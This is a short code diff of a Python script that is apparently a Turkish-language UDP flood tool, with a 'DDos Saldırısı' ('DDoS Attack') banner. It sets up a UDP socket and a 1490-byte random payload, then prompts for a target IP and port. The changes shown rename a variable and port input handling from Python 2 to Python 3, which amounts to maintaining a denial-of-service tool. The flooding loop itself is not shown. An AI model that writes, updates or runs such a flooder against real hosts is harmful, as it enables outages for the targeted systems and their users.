@@ -11,7 +11,7 @@ saat = şimdi.hour
 dakika = şimdi.minute
 gün = şimdi.day
 ay = şimdi.month
-yıl = şimdi.year
+yil = şimdi.year
 
 ##############
 soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -20,8 +20,8 @@ baytlar = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Saldırısı")
-print
-ip = raw_input("IP Hedefi : ")
+print 
+ip = input("IP Hedefi : ")
 port = input("Port : ")
 
 os.system("clear")
